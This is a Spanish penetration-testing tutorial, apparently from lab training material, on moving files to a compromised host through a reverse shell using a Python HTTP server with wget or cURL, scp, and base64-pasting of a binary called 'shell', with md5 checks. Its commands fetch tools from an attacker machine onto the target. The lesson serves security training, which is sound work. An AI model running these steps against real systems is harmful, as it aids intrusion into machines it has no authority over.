**Transferencia de Archivos**  
Durante cualquier ejercicio de pruebas de penetración, es probable que necesitemos transferir archivos al servidor remoto, como scripts de enumeración o exploits, o transferir datos de vuelta a nuestra máquina de ataque. Si bien herramientas como Metasploit con un shell Meterpreter nos permiten usar el comando _Upload_ para subir un archivo, necesitamos aprender métodos para transferir archivos con un shell inverso estándar.

**Usando wget**  
Existen muchos métodos para lograr esto. Un método es ejecutar un servidor HTTP en nuestra máquina con Python y luego usar _wget_ o _cURL_ para descargar el archivo en el host remoto. Primero, vamos al directorio que contiene el archivo que necesitamos transferir y ejecutamos un servidor HTTP de Python en él:

Transferencia de Archivos
pista95@htb[/htb]$ cd /tmp pista95@htb[/htb]$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) 

Ahora que hemos configurado un servidor en escucha en nuestra máquina, podemos descargar el archivo en el host remoto donde tenemos ejecución de código:

Transferencia de Archivos user@remotehost$ wget http://10.10.14.1:8000/linenum.sh 

Observa que usamos nuestra IP (10.10.14.1) y el puerto en el que está ejecutándose nuestro servidor Python (8000). Si el servidor remoto no tiene _wget_, podemos usar _cURL_ para descargar el archivo:

Transferencia de Archivos user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh 

 _-o_ especifica el nombre del archivo de salida.
 
**Usando SCP**  

Otro método para transferir archivos es utilizando _scp_, siempre que tengamos credenciales de usuario _ssh_ en el host remoto. Podemos hacerlo de la siguiente manera:

  `Transferencia de Archivos pista95@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh  Contraseña de user@remotehost: ********* linenum.sh`

Ten en cuenta que especificamos el nombre del archivo local después de _scp_, y el directorio remoto donde se guardará después de los dos puntos `:`.

**Usando Base64**  
En algunos casos, puede que no podamos transferir el archivo directamente. Por ejemplo, el host remoto podría tener protecciones de firewall que impiden descargar archivos desde nuestra máquina. En este tipo de situación, podemos usar un truco simple para codificar el archivo en formato _base64_ y luego pegar la cadena _base64_ en el servidor remoto para decodificarla. Por ejemplo, si queremos transferir un archivo binario llamado _shell_, podemos codificarlo en _base64_ de la siguiente manera:

  `pista95@htb[/htb]$ base64 shell -w 0  f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU`

Ahora, podemos copiar esta cadena _base64_, ir al host remoto, y usar _base64 -d_ para decodificarla y redirigir la salida a un archivo:

  `user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

Este método es útil cuando los métodos convencionales de transferencia de archivos están bloqueados por medidas de seguridad como cortafuegos.

**Validando Transferencias de Archivos**  
Para validar el formato de un archivo, podemos usar el comando _file_ en él:


  `user@remotehost$ file shell shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header`

Como podemos ver, cuando ejecutamos el comando _file_ sobre el archivo _shell_, nos indica que es un binario ELF, lo que significa que lo transferimos correctamente. Para asegurarnos de que no hubo errores durante el proceso de codificación/decodificación, podemos verificar su hash md5. En nuestra máquina, podemos ejecutar _md5sum_ sobre el archivo:

   pista95@htb[/htb]$ md5sum shell  321de1d7e7c3735838890a72c9ae7d1d shell`

Luego, podemos ir al servidor remoto y ejecutar el mismo comando sobre el archivo que transferimos:

  `user@remotehost$ md5sum shell  321de1d7e7c3735838890a72c9ae7d1d shell`

Como podemos ver, ambos archivos tienen el mismo hash md5, lo que significa que el archivo fue transferido correctamente. Existen varios otros métodos para transferir archivos. Puedes revisar el módulo de Transferencias de Archivos para un estudio más detallado sobre el tema.
